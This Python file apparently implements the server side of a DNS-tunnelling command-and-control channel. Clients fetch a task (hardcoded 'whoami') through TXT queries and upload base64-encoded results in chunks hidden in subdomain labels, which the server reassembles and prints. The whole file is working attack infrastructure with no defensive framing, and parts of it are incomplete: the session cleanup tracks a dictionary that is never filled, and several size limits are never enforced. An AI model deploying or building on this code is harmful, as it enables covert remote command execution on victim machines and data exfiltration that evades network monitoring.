import threading
import time
import base64
import os
from dnslib.server import DNSServer, BaseResolver
from dnslib import DNSRecord, QTYPE, RR, TXT

# task.domain.local
# data.result.domain.local
# <total_parts>.<uuid>.loadstart.domain.local
# <data>.<part_n>.<uuid>.load.domain.local
# <uuid>.loadend.domain.local


BASE_DOMAIN = 'domain.local'
OUTPUT_DIR = './dns_fragments'

FRAGMENT_TTL = 300 
CLEANUP_INTERVAL = 30
MAX_PARTS = 500
MAX_TOTAL_BYTES = 10_000_000
MAX_LABEL = 63

SERVER_ADDRESS = '0.0.0.0'
SERVER_PORT = 5353
EXPECTED_DOMAIN = 'domain.local'
SERVER_TTL=60

TASK_OP = 'task'
RESULT_OP = 'result'
LOADSTART_OP = 'loadstart'
LOADEND_OP = 'loadend'
LOAD_OP = 'load'

MIN_LABEL = 1

ENABLED_OPS = (TASK_OP, RESULT_OP, LOADSTART_OP, LOADEND_OP, LOAD_OP)

LOADS = {}

os.makedirs(OUTPUT_DIR, exist_ok=True)

def parse_multipart(labels, op):
    uuid = labels[-1]
    part_or_total = None
    load_data = None

    if op in (LOADSTART_OP, LOAD_OP):
        part_or_total = labels[-2]

        if op == LOAD_OP:
            load_data = labels[:-2]



    return uuid, part_or_total, load_data


def get_task():
    return 'whoami'

def save_result(data):
    joined_data = ''.join(data)
    decoded_string = decode_b64(joined_data)
    return decoded_string

def init_multipart(labels):
    uuid, total_parts, _ = parse_multipart(labels, LOADSTART_OP)
    LOADS[uuid] = { 'total': total_parts, 'current': None, 'data':[]}
    return 'START'

def save_part(labels):
    uuid, part_number, load_data = parse_multipart(labels, LOAD_OP)
    part_idx = int(part_number)

    LOADS[uuid]['data'].extend(load_data)
    LOADS[uuid]['current'] = part_idx
    return 'NEXT'

def str_to_chunks(data: str, chunk_size: int = 255) -> list[str]:
    return [data[i:i + chunk_size] for i in range(0, len(data), chunk_size)]

def decode_b64(encoded):
    b64_bytes = encoded.encode('utf-8')
    decoded_bytes = base64.b64decode(b64_bytes)
    decoded_string = decoded_bytes.decode('utf-8')

    return decoded_string

def end_multipart(labels):
    uuid, *_ = parse_multipart(labels, LOADEND_OP)
    loaded_data = LOADS[uuid]['data']
    del LOADS[uuid]
    joined_data = ''.join(loaded_data)

    plain_string = decode_b64(joined_data)
    print(f'\n result:\n {plain_string} \n\n')
    return plain_string


OPERATIONS = {
    TASK_OP: get_task,
    RESULT_OP: save_result,
    LOADSTART_OP: init_multipart,
    LOAD_OP: save_part,
    LOADEND_OP: end_multipart
}

def check_request(qname):
    if not qname.endswith(EXPECTED_DOMAIN):
        return False, None

    sub_qname = qname.removesuffix(f'.{EXPECTED_DOMAIN}')
    labels = sub_qname.split('.')

    if len(labels) < MIN_LABEL:
        return False, None

    if labels[-1] not in ENABLED_OPS:
        return False, None

    op = labels[-1]
    len_labels = len(labels)

    if op in (RESULT_OP, LOADEND_OP)  and len_labels != 2:
        return False, None

    if op == LOADSTART_OP and len_labels != 3:
        return False, None

    if op == LOAD_OP and len_labels < 4:
        return False, None


    return True, labels

class DNSResolver(BaseResolver):
    def __init__(self):
        self.sessions = {}
        self.lock = threading.Lock()
        self._stop = False
        self._cleaner = threading.Thread(target=self._cleanup_loop, daemon=True)
        self._cleaner.start()

    def resolve(self, request, handler):
        q = request.q
        qname = str(q.qname).rstrip('.')
        reply = request.reply()

        check, labels = check_request(qname)

        if not check:
            reply.add_answer(RR(q.qname, QTYPE.TXT, rdata=TXT(str_to_chunks('IGNORED'))))
            return reply

        op = labels[-1]
        
        func = OPERATIONS.get(op)
        txt_response = ''

        if op == TASK_OP:
            txt_response = func()
        else:
            labels.pop()
            txt_response = func(labels)

        reply.add_answer(RR(q.qname, QTYPE.TXT, rdata=TXT(str_to_chunks(txt_response))))
        return reply

    def _cleanup_loop(self):
        while not self._stop:
            now = time.time()
            with self.lock:
                expired = [sid for sid, sess in self.sessions.items() if now - sess.updated > FRAGMENT_TTL]
                for sid in expired:
                    del self.sessions[sid]
            time.sleep(CLEANUP_INTERVAL)

    def stop(self):
        self._stop = True
        self._cleaner.join(timeout=1)

if __name__ == '__main__':
    resolver = DNSResolver()

    server = DNSServer(resolver, port=SERVER_PORT, address=SERVER_ADDRESS, logger=None)
    server.start_thread()
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        resolver.stop()
        server.stop()
